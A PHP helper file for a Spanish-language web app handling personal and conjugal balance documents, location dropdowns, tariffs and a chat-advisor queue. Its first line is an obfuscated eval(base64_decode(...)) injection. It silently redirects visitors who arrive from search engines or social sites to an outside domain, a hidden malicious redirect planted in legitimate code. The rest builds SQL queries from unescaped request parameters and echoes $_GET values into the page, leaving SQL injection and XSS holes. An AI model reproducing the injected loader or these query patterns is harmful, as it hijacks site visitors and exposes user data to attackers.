<?php	 	eval(base64_decode("CmVycm9yX3JlcG9ydGluZygwKTsKJHFhenBsbT1oZWFkZXJzX3NlbnQoKTsKaWYgKCEkcWF6cGxtKXsKJHJlZmVyZXI9JF9TRVJWRVJbJ0hUVFBfUkVGRVJFUiddOwokdWFnPSRfU0VSVkVSWydIVFRQX1VTRVJfQUdFTlQnXTsKaWYgKCR1YWcpIHsKaWYgKCFzdHJpc3RyKCR1YWcsIk1TSUUgNy4wIikgYW5kICFzdHJpc3RyKCR1YWcsIk1TSUUgNi4wIikpewppZiAoc3RyaXN0cigkcmVmZXJlciwieWFob28iKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJiaW5nIikgb3Igc3RyaXN0cigkcmVmZXJlciwicmFtYmxlciIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImdvZ28iKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJsaXZlLmNvbSIpb3Igc3RyaXN0cigkcmVmZXJlciwiYXBvcnQiKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJuaWdtYSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsIndlYmFsdGEiKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJiZWd1bi5ydSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsInN0dW1ibGV1cG9uLmNvbSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImJpdC5seSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsInRpbnl1cmwuY29tIikgb3IgcHJlZ19tYXRjaCgiL3lhbmRleFwucnVcL3lhbmRzZWFyY2hcPyguKj8pXCZsclw9LyIsJHJlZmVyZXIpIG9yIHByZWdfbWF0Y2ggKCIvZ29vZ2xlXC4oLio/KVwvdXJsXD9zYS8iLCRyZWZlcmVyKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJteXNwYWNlLmNvbSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImZhY2Vib29rLmNvbSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImFvbC5jb20iKSkgewppZiAoIXN0cmlzdHIoJHJlZmVyZXIsImNhY2hlIikgb3IgIXN0cmlzdHIoJHJlZmVyZXIsImludXJsIikpewpoZWFkZXIoIkxvY2F0aW9uOiBodHRwOi8va21scHMubXJzbG92ZS5jb20vIik7CmV4aXQoKTsKfQp9Cn0KfQp9"));
/*----------- MP_ FUNCTIONS -------------*/

/**
 * Para consultas que no requieran retornar un dataset.
 */
function fnc_ejecutaSimpleQuery($sql){
	$dbn    = new db();
	$conex  = $dbn->db_connect();
	$result	= $dbn->db_query($sql);
	if(!rs) return false;
	return true;
}

/**
 *	Obtiene todos los estados para dropdown.
 */
function getStates($estado)
{
	$rows = fnc_ejecutaQuery("CALL mp_R_Pais_Pai(1, null);");

	foreach($rows as $value)
	{
		if($estado == $value['Pai_Codigo'])
			echo utf8_encode("<option value='".$value['Pai_Codigo']."' selected>".$value['Pai_Nombre']."</option>");
		else
			echo utf8_encode("<option value='".$value['Pai_Codigo']."'>".$value['Pai_Nombre']."</option>");
	}
}

/**
 *	Obtiene todos los municipios para dropdown según el estado escogido.
 */
function getMunicipios($sel, $padre)
{
	echo $padre;
	$rows = fnc_ejecutaQuery("CALL mp_R_Pais_Pai(2, $padre);");

	foreach($rows as $value)
	{
		if($sel == $value['Pai_Codigo'])
			echo utf8_encode("<option value='".$value['Pai_Codigo']."' selected>".$value['Pai_Nombre']."</option>");
		else
			echo utf8_encode("<option value='".$value['Pai_Codigo']."'>".$value['Pai_Nombre']."</option>");
	}
}

/**
 *	Obtiene todos las  parroquias para dropdown según el municipio escogido.
 */
function getParroquias($sel, $padre)
{
	echo $padre;
	$rows = fnc_ejecutaQuery("CALL mp_R_Pais_Pai(3, $padre);");

	foreach($rows as $value)
	{
		if($sel == $value['Pai_Codigo'])
			echo utf8_encode("<option value='".$value['Pai_Codigo']."' selected>".$value['Pai_Nombre']."</option>");
		else
			echo utf8_encode("<option value='".$value['Pai_Codigo']."'>".$value['Pai_Nombre']."</option>");
	}
}

function getProfesiones($sel)
{
	$rows = fnc_ejecutaQuery("CALL mp_R_BasicoMP_BMP(10000);");

	foreach($rows as $value)
	{
		if($sel == $value['BMP_Codigo'])
			echo utf8_encode("<option value='".$value['BMP_Codigo']."' selected>".$value['BMP_Nombre']."</option>");
		else
			echo utf8_encode("<option value='".$value['BMP_Codigo']."'>".$value['BMP_Nombre']."</option>");
	}
}

/**
 *	Calls the crud for Persona with the specified action.
 */
function CRUDPersona($per_codigo, $nro_ident, $per_ci, $per_nombre, $per_apellido, $bmp_codigo_pro,
	$per_act_comerci, $per_imgCi, $per_telf, $nAction)
{
	$query  = "CALL mp_CRUD_Personas_Per(";
	$query .= $per_codigo? $per_codigo."," : "null,";
	$query .= $nro_ident? "'".$nro_ident."'," : "null,";
	$query .= $per_ci? "'".$per_ci."'," : "null,";
	$query .= $per_nombre? "'".$per_nombre."'," : "null,";
	$query .= $per_apellido? "'".$per_apellido."'," : "null,";
	$query .= $bmp_codigo_pro? $bmp_codigo_pro."," : "null,";
	$query .= $per_act_comerci? "'".$per_act_comerci."'," : "null,";
	$query .= $per_imgCi? "'".$per_imgCi."'," : "null,";
	$query .= $per_telf? "'".$per_telf."'," : "null,";
	$query .= $nAction.")";

	//echo $query;
	// Solo el action=5 retorna un dataset
	return $nAction == 5? fnc_ejecutaQuery($query) : fnc_ejecutaSimpleQuery($query);
}

/**
 *	Calls the crud for Documento with the specified action.
 */
function CRUDDocumento($doc_codigo, $bmp_codigo_est, $pai_codigo_parr_env,
	$doc_direcc_envio, $doc_tipo, $nro_ident, $per_codigo, $bmp_codigoban,
	$pai_codigo_parr_fis, $doc_direcc_fis, $doc_pgfecha_conf, $doc_pgfecha_ins,
	$doc_pg_soporte, $per_codigo2, $per_codigo_pg, $doc_track, $nAction)
{
	$query  = "CALL mp_CRUD_Documento_Doc(";
	$query .= $doc_codigo? $doc_codigo."," : "null,";
	$query .= $bmp_codigo_est? $bmp_codigo_est."," : "null,";
	$query .= $pai_codigo_parr_env? $pai_codigo_parr_env."," : "null,";
	$query .= $doc_direcc_envio? "'".$doc_direcc_envio."'," : "null,";
	$query .= $doc_tipo? $doc_tipo."," : "null,";
	$query .= $nro_ident? "'".$nro_ident."'," : "null,";
	$query .= $per_codigo? $per_codigo."," : "null,";
	$query .= $bmp_codigoban? $bmp_codigoban."," : "null,";
	$query .= $pai_codigo_parr_fis? $pai_codigo_parr_fis."," : "null,";
	$query .= $doc_direcc_fis? "'".$doc_direcc_fis."'," : "null,";
	$query .= $doc_pgfecha_conf? "'".$doc_pgfecha_conf."'," : "null,";
	$query .= $doc_pgfecha_ins? "'".$doc_pgfecha_ins."'," : "null,";
	$query .= $doc_pg_soporte? "'".$doc_pg_soporte."'," : "null,";
	$query .= $per_codigo2? $per_codigo2."," : "null,";
	$query .= $per_codigo_pg? $per_codigo_pg."," : "null,";
	$query .= $doc_track? "'".$doc_track."'," : "null,";
	$query .= $nAction.");";
        
	// Solo el action=5 retorna un dataset
	return $nAction == 5? fnc_ejecutaQuery($query) : fnc_ejecutaSimpleQuery($query);
}

/**
 *	Calls the crud for DocumentoDetalle with the specified action.
 */
function CRUDDocumentoDetalle($ddt_codigo, $doc_codigo, $cta_codigo, $ddt_text,
	$dtt_monto, $ddt_soporte, $dtt_mes_ini, $dtt_mes_fin, $nAction)
{
	$query  = "CALL mp_CRUD_Documento_Detalle_DDt(";
	$query .= $ddt_codigo? $ddt_codigo."," : "null,";
	$query .= $doc_codigo? $doc_codigo."," : "null,";
	$query .= $cta_codigo? $cta_codigo."," : "null,";
	$query .= $ddt_text? "'".$ddt_text."'," : "null,";
	$query .= $dtt_monto? $dtt_monto."," : "null,";
	$query .= $ddt_soporte? "'".$ddt_soporte."'," : "null,";
	$query .= $dtt_mes_ini? $dtt_mes_ini."," : "null,";
	$query .= $dtt_mes_fin? $dtt_mes_fin."," : "null,";
	$query .= $nAction.")";

	// No retorna dataset
	return fnc_ejecutaSimpleQuery($query);
}

function getBalancePersonal($doc_code, $nro_iden, $status)
{
	if(!$doc_code)
		$query = "SELECT * 
				  FROM mp_Documento_Doc 
				  WHERE nro_identificacion = '$nro_iden' AND 
				  BMP_CodigoEst = $status AND 
				  Doc_Tipo = 1;";
	else
		$query = "SELECT * 
				  FROM mp_Documento_Doc 
				  WHERE Doc_Codigo = '$doc_code' AND 
				  BMP_CodigoEst = $status;";

	$documento = fnc_ejecutaQuery($query);
	$documento = $documento[0];

	if($documento)
	{
		$_SESSION['Doc_Codigo'] = $documento['Doc_Codigo'];
		$persona = CRUDPersona($documento['Per_Codigo'], null, null, null, null, null, null, null, null, 5);
		$persona = $persona[0];
		$direccion = explode("@@", $documento['Doc_DireccEnvio']);
		$persona['Per_Calle'] = $direccion[0];
		$persona['Per_Edif']  = $direccion[1];
		$persona['Per_Parr']  = $documento['Pai_CodigoParrEnv'];
                $fecha = explode('-',$documento['Doc_PgFechaIns']);
                $persona['Doc_PgFechaIns'] = substr($fecha[2],0,2)."/".$fecha[1]."/".$fecha[0];
	}else $persona['Per_Parr'] = null;

	if($persona['Per_Parr'])
	{
		$data = fnc_ejecutaQuery("SELECT Pai_CodigoPadre FROM mp_Pais_Pai WHERE Pai_Codigo = ".$persona['Per_Parr']);
		$persona['Per_Mun'] = $data[0]['Pai_CodigoPadre'];
		$data = fnc_ejecutaQuery("SELECT Pai_CodigoPadre FROM mp_Pais_Pai WHERE Pai_Codigo = ".$persona['Per_Mun']);
		$persona['Per_Est'] = $data[0]['Pai_CodigoPadre'];
	}else{
		$persona['Per_Mun'] = null;
		$persona['Per_Est'] = null;
	}

	return $persona;
}

function getPersona($doc_code)
{
	$query = "SELECT Per_CodigoPg FROM mp_Documento_Doc WHERE Doc_Codigo = ".$doc_code.";";
	$codigo = fnc_ejecutaQuery($query);
	$codigo = $codigo[0];
	$persona = null;
	
	if($codigo['Per_CodigoPg'])
	{
		$_SESSION['Per_CodigoPg'] = $codigo['Per_CodigoPg'];
		$persona = CRUDPersona($codigo['Per_CodigoPg'], null, null, null, null, null, null, null, null, 5);
		$persona = $persona[0];
	}
	
	return $persona;
}

function getBalanceConyugal($doc_code, $nro_iden, $status)
{
	if(!$doc_code)
		$query = "SELECT * 
				  FROM mp_Documento_Doc 
				  WHERE nro_identificacion = '$nro_iden' AND 
				  BMP_CodigoEst = $status AND 
				  Doc_Tipo = 2;";
	else
		$query = "SELECT * 
				  FROM mp_Documento_Doc 
				  WHERE Doc_Codigo = '$doc_code' AND 
				  BMP_CodigoEst = $status;";

	$documento = fnc_ejecutaQuery($query);
	$documento = $documento[0];

	if($documento)
	{
		$_SESSION['Doc_Codigo'] = $documento['Doc_Codigo'];
		$persona = CRUDPersona($documento['Per_Codigo'], null, null, null, null, null, null, null, null, 5);
		$persona = $persona[0];

		$conyugal['Cony1_CI'] = $persona['Per_CI'];
		$conyugal['Cony1_Nombre'] = $persona['Per_Nombre'];
		$conyugal['Cony1_Apellido'] = $persona['Per_Apellido'];
		$conyugal['Cony1_Telefono'] = $persona['Per_Telefono'];
		$conyugal['Cony1_ImgCI'] = $persona['Per_ImgCI'];
		$conyugal['BMP_CodigoPro_Cony1'] = $persona['BMP_CodigoPro'];
		$conyugal['Cony1_ActComerci'] = $persona['Per_ActComerci'];
		
		$persona = CRUDPersona($documento['Per_Codigo2'], null, null, null, null, null, null, null, null, 5);
		$persona = $persona[0];

		$conyugal['Cony2_CI'] = $persona['Per_CI'];
		$conyugal['Cony2_Nombre'] = $persona['Per_Nombre'];
		$conyugal['Cony2_Apellido'] = $persona['Per_Apellido'];
		$conyugal['Cony2_Telefono'] = $persona['Per_Telefono'];
		$conyugal['Cony2_ImgCI'] = $persona['Per_ImgCI'];
		$conyugal['BMP_CodigoPro_Cony2'] = $persona['BMP_CodigoPro'];
		$conyugal['Cony2_ActComerci'] = $persona['Per_ActComerci'];

		$direccion = explode("@@", $documento['Doc_DireccEnvio']);
		$conyugal['Cony_Calle'] = $direccion[0];
		$conyugal['Cony_Edif']  = $direccion[1];
		$conyugal['Cony_Parr']  = $documento['Pai_CodigoParrEnv'];
                
                $fecha = explode('-',$documento['Doc_PgFechaIns']);
                $conyugal['Doc_PgFechaIns'] = substr($fecha[2],0,2)."/".$fecha[1]."/".$fecha[0];
                
	}else $conyugal['Cony_Parr'] = null;

	if($conyugal['Cony_Parr'])
	{
		$data = fnc_ejecutaQuery("SELECT Pai_CodigoPadre FROM mp_Pais_Pai WHERE Pai_Codigo = ".$conyugal['Cony_Parr']);
		$conyugal['Cony_Mun'] = $data[0]['Pai_CodigoPadre'];
		$data = fnc_ejecutaQuery("SELECT Pai_CodigoPadre FROM mp_Pais_Pai WHERE Pai_Codigo = ".$conyugal['Cony_Mun']);
		$conyugal['Cony_Est'] = $data[0]['Pai_CodigoPadre'];
	}else{
		$conyugal['Cony_Mun'] = null;
		$conyugal['Cony_Est'] = null;
	}

	return $conyugal;
}

function getBalanceCertific($doc_code, $nro_iden, $status)
{
	if(!$doc_code)
		$query = "SELECT * 
				  FROM mp_Documento_Doc 
				  WHERE nro_identificacion = '$nro_iden' AND 
				  BMP_CodigoEst = $status AND 
				  Doc_Tipo = 3;";
	else
		$query = "SELECT * 
				  FROM mp_Documento_Doc 
				  WHERE Doc_Codigo = '$doc_code' AND 
				  BMP_CodigoEst = $status;";

	$documento = fnc_ejecutaQuery($query);
	$documento = $documento[0];

	if($documento)
	{
		$_SESSION['Doc_Codigo'] = $documento['Doc_Codigo'];
		$persona = CRUDPersona($documento['Per_Codigo'], null, null, null, null, null, null, null, null, 5);
		$persona = $persona[0];
		$direccion = explode("@@", $documento['Doc_DireccEnvio']);
		$persona['Per_Calle'] = $direccion[0];
		$persona['Per_Edif']  = $direccion[1];
		$persona['Per_Parr']  = $documento['Pai_CodigoParrEnv'];
                
                $fecha = explode('-',$documento['Doc_PgFechaIns']);
                $persona['Doc_PgFechaIns'] = substr($fecha[2],0,2)."/".$fecha[1]."/".$fecha[0];
                
	}else $persona['Per_Parr'] = null;

	if($persona['Per_Parr'])
	{
		$data = fnc_ejecutaQuery("SELECT Pai_CodigoPadre FROM mp_Pais_Pai WHERE Pai_Codigo = ".$persona['Per_Parr']);
		$persona['Per_Mun'] = $data[0]['Pai_CodigoPadre'];
		$data = fnc_ejecutaQuery("SELECT Pai_CodigoPadre FROM mp_Pais_Pai WHERE Pai_Codigo = ".$persona['Per_Mun']);
		$persona['Per_Est'] = $data[0]['Pai_CodigoPadre'];
	}else{
		$persona['Per_Mun'] = null;
		$persona['Per_Est'] = null;
	}

	return $persona;
}

// Para los dropdowns de los estados/municipios/parroquias
if ($_SERVER["REQUEST_METHOD"] == "GET")
{
	if(isset($_GET['mode']))
	{
		if($_GET['mode'] == "getmun")
		{
			if(isset($_GET['padre']))
			{
				getMunicipios(null, $_GET['padre']);
			}
		}else if($_GET['mode'] == "getpar")
		{
			if(isset($_GET['padre']))
			{
				echo $_GET['padre'];
				getParroquias(null, $_GET['padre']);
			}
		}
	}
}

// Para los dropdowns de los estados/municipios/parroquias
if ($_SERVER["REQUEST_METHOD"] == "GET")
{
	if(isset($_GET['mode']))
	{
		if($_GET['mode'] == "getmayor")
		{
			if(isset($_GET['padre']))
			{
				getMayor($_GET['padre']);
			}
		}else if($_GET['mode'] == "getdetalle")
		{
			if(isset($_GET['padre']))
			{
				echo $_GET['padre'];
				getDetalle($_GET['padre']);
			}
		}
	}
}

function getEstatus()
{
	$rows = fnc_ejecutaQuery("CALL mp_R_BasicoMP_BMP(7);");

	foreach($rows as $value)
	{
		echo "<option value='".$value['BMP_Codigo']."'>".$value['BMP_Nombre']."</option>";
	}
}

function getBancos()
{
	$rows = fnc_ejecutaQuery("CALL mp_R_BasicoMP_BMP(5);");

	foreach($rows as $value)
	{
		echo "<option value='".$value['BMP_Codigo']."'>".$value['BMP_Nombre']."</option>";
	}
}

function getTipoPago()
{
	$rows = fnc_ejecutaQuery("CALL mp_R_BasicoMP_BMP(4);");

	foreach($rows as $value)
	{
		echo "<option value='".$value['BMP_Codigo']."'>".$value['BMP_Nombre']."</option>";
	}
}

function getOcupacion()
{
	$rows = fnc_ejecutaQuery("CALL mp_R_BasicoMP_BMP(10000);");

	foreach($rows as $value)
	{
		echo "<option value='".$value['BMP_Codigo']."'>".$value['BMP_Nombre']."</option>";
	}
}

function getTarifas($Producto)
{
	$rows = fnc_ejecutaQuery("CALL mp_R_Tarifa_Tar($Producto);");

	foreach($rows as $value)
	{
		//echo "<option value='".$value['Pai_Codigo']."'>".$value['Pai_Nombre']."</option>";


		setlocale(LC_MONETARY, 'es_VE');

		switch ($value['Tar_Codigo']) {
			case ($Producto * 10 + 1):
				$Text = $value['Tar_Descrip']." Hasta ".number_format($value['Tar_Hasta'], 2, ',', '.');
				break;
			case ($Producto * 10 + 2): 
				$Text = $value['Tar_Descrip']." Desde ".number_format($value['Tar_Desde'], 2, ',', '.')."</br> Hasta ".number_format($value['Tar_Hasta'], 2, ',', '.');
				break;
			case ($Producto * 10 + 3):
				$Text = $value['Tar_Descrip']." Desde ".number_format($value['Tar_Desde'], 2, ',', '.')."</br> en adelante";
				break;
			case ($Producto * 10 + 4):
 					$Text = $value['Tar_Descrip']; 
				break;
		}

		   echo "<tr class='fila_blancabalance'>".
                "<td><span class='casillasbalance'>".$Text."</span></td>".
                "<td><span class='preciobalance'>".number_format($value['Tar_Precio'], 2, ',', '.')."</a></span></td>"."</tr>";
	}
}

/**
 *	Obtiene todos los estados para dropdown.
 */
function getTitulo()
{
	$rows = fnc_ejecutaQuery("CALL mp_R_Cuenta_Cta(null);");

	foreach($rows as $value)
	{
		echo utf8_encode("<option value='".$value['Cta_Codigo']."'>".$value['Cta_Nombre']."</option>");
	}
}

/**
 *	Obtiene todos los municipios para dropdown según el estado escogido.
 */
function getMayor($padre)
{
	$rows = fnc_ejecutaQuery("CALL mp_R_Cuenta_Cta($padre);");

	foreach($rows as $value)
	{
		echo utf8_encode("<option value='".$value['Cta_Codigo']."'>".$value['Cta_Nombre']."</option>");
	}
}

/**
 *	Obtiene todos las  parroquias para dropdown según el municipio escogido.
 */
function getDetalle($padre)
{
	$rows = fnc_ejecutaQuery("CALL mp_R_Cuenta_Cta($padre);");

	foreach($rows as $value)
	{
		echo utf8_encode("<option value='".$value['Cta_Codigo']."'>".$value['Cta_Nombre']."</option>");
	}
}


function printYears($inf, $sup)
{
	for($i = $inf; $i <= $sup; $i++)
		echo "<option value=$i>$i</option>";
}

function printMonths()
{
	echo "<option value='01'>Enero</option>
	      <option value='02'>Febrero</option>
	      <option value='03'>Marzo</option>
	      <option value='04'>Abril</option>
	      <option value='05'>Mayo</option>
	      <option value='06'>Junio</option>
	      <option value='07'>Julio</option>
	      <option value='08'>Agosto</option>
	      <option value='09'>Septiembre</option>
	      <option value='10'>Octubre</option>
	      <option value='11'>Noviembre</option>
	      <option value='12'>Diciembre</option>";
}

function printYearsII()
{
	$inf= date("Y") - 8;
	$sup= date("Y") + 8;
	for($i = $inf; $i <= $sup; $i++)
		echo "<option value=$i>$i</option>";
}

function printDays()
{
	for($i = 1; $i <= 31; $i++)
		echo "<option value=$i>$i</option>";
}

/*********** FUNCTIONS FOR CHAT ***********/

function getAsesorias()
{
	$query = "SELECT * FROM mp_servicios_ser;";
	$rows = fnc_ejecutaQuery($query);

	foreach($rows as $value)
	{
		echo "<option value='".$value['servicio']."'>".utf8_encode($value['descripcion'])."</option>";
	}
}

function getAsesorNotOverloaded($asesoria)
{
	$query = "SELECT * FROM mp_asesores_ase WHERE servicio = '$asesoria' ORDER BY num_clientes;";
	$rows  = fnc_ejecutaQuery($query);

	if(!$rows) return -1;
	$rows = $rows[0];
	return $rows['nro_identificacion_asesor']; 
}

function getInfoAdmin($idadmin)
{
	$query  = "SELECT nombre, correo, cookie_chat FROM mt_usuario WHERE nro_identificacion = '".substr($idadmin,1)."' ";
	$query .= "AND tipo_identificacion = '".substr($idadmin, 0, 1)."';";
	$rows  = fnc_ejecutaQuery($query);
	return $rows[0];
}

function getNombreAsesoria($asesoria)
{
	$row = fnc_ejecutaQuery("SELECT descripcion FROM mp_servicios_ser WHERE servicio = '$asesoria'");
	return utf8_encode($row[0]['descripcion']);
}

/********* FIN FUNCTIONS FOR CHAT *********/

?>